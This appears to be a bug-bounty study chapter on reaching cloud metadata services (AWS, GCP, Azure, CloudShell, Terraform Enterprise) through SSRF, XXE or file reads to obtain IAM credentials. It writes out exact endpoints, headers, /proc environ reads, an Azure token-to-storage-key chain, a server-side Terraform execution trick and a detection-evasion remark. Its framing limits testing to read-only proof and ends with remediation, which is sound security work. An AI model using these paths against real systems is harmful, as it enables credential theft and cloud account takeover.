# Ch2: Metadata Services & the SSRF → IAM Hop

Source: `aws/general-knowledge/intro_metadata_service.md`, `aws/exploitation/ec2-metadata-ssrf.md`, `lambda-steal-iam-credentials.md`, `gcp/…/metadata_in_google_cloud_instances.md`, `azure/abusing-managed-identities.md`, `terraform/terraform_enterprise_metadata_service.md`, `aws/post_exploitation/get_iam_creds_from_console_session.md`. Every major cloud exposes a link-local metadata endpoint that vends temporary credentials — the highest-value SSRF target and the core of the cloud kill chain.

> **Bounty boundary:** reaching the metadata endpoint *at all* is the
> reportable bug. Read-only proof = fetch a harmless key (`ami-id`,
> `hostname`, instance-id) or the IAM role *name* — never mint/use the
> vended credentials, never pivot onward. Credential use = ch03's gate.

## AWS IMDS — the crown jewel

- **IMDSv1 (GET only, still widespread)**: `http://169.254.169.254/latest/meta-data/`. Also reachable over IPv6 `http://[fd00:ec2::254]/` on Nitro instances — try when v4 is filtered.
- **Role check first**: `GET /latest/meta-data/iam/` → 404 = no role attached; 200-empty = role revoked; role name listed under `iam/security-credentials/` → fetch `…/security-credentials/<role-name>` for `AccessKeyId`/`SecretAccessKey`/`Token` (ASIA creds → ch03).
- **Other high-value paths**: `/latest/user-data/` (bootstrap script — frequently contains hardcoded secrets; also `aws ec2 describe-instance-attribute --attribute userData` with API access); `/latest/dynamic/instance-identity/document` (accountId, region, privateIp — non-credential proof of reach).
- **IMDSv2 defenses** — token required: `PUT /latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` then `X-aws-ec2-metadata-token: $TOKEN` header. SSRF usually can't PUT → strong mitigation; requests carrying `X-Forwarded-For` are rejected (kills naive reverse-proxy SSRF); default hop-limit 1 stops misconfigured routers and default-bridge Docker containers (configurable — a raised hop limit means containers *can* reach it).
- **Exploiting through the app**: SSRF, XXE (`file://`/`http://`), and command injection all reach IMDSv1. Mandiant has documented automated scanning for exactly this — it's the Capital One pattern.

## Lambda & container variants

- **Lambda creds via file read** — env vars hold the session creds: `file:///proc/self/environ` through XXE/LFI/file-protocol SSRF (WAF-blocked? try `/proc/<pid>/environ` for pid 1–20).
- **Lambda event data via HTTP** — `http://$AWS_LAMBDA_RUNTIME_API/2018-06-01/runtime/invocation/next` (commonly `169.254.100.1:9001`) returns the invoking event — often the only data worth grabbing.
- **No GuardDuty alert fires for stolen Lambda creds** (unlike EC2 creds used off-instance — ch07).

## GCP, Azure, Terraform equivalents

- **GCP** — `http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text -H "Metadata-Flavor: Google"` (also `169.254.169.254`, `metadata`). Keys: `instance/service-accounts/default/token` (OAuth access token — the prize), `…/scopes`, `…/email`, `project/project-id`, `instance/attributes/` (often secrets). The `Metadata-Flavor` header requirement is GCP's IMDSv2-analog — many SSRF bugs can still set it.
- **Azure VMs** — `http://169.254.169.254/metadata/instance?api-version=…` needs `Metadata: true` header; App Service/Functions use env vars: `curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"` → JWT + clientId → `Connect-AzAccount -AccessToken … -AccountId …` → `Get-AzResource`/`Get-AzStorageAccountKey` (managed-identity over-assignment = subscription-wide read, ch08).
- **AWS CloudShell** — console sessions expose an IMDS-like endpoint on `localhost:1338` (`PUT /latest/api/token` → `GET /latest/meta-data/container/security-credentials`) converting console access into CLI creds.
- **Terraform Cloud/Enterprise** — a `.atlasv1.` API token → `/api/v2/organizations` → workspaces → configure a `remote` backend → `terraform init --backend-config="token=$TFE_TOKEN"` → `terraform plan` executes a `local-exec`/`external` provider program *server-side* → reach the TFE metadata service for cloud creds. Plan is non-destructive; output returns via the external-provider JSON protocol.

**Bounty-safe validation**: prove reach with the cheapest node — `/latest/meta-data/` 200 or the identity document beats dumping credentials. If creds are in scope to fetch, capture one redacted screenshot (mask the secret), confirm once with `get-caller-identity`, report immediately. Note the IMDS version and hop-limit in the report — remediation is usually "enforce IMDSv2."
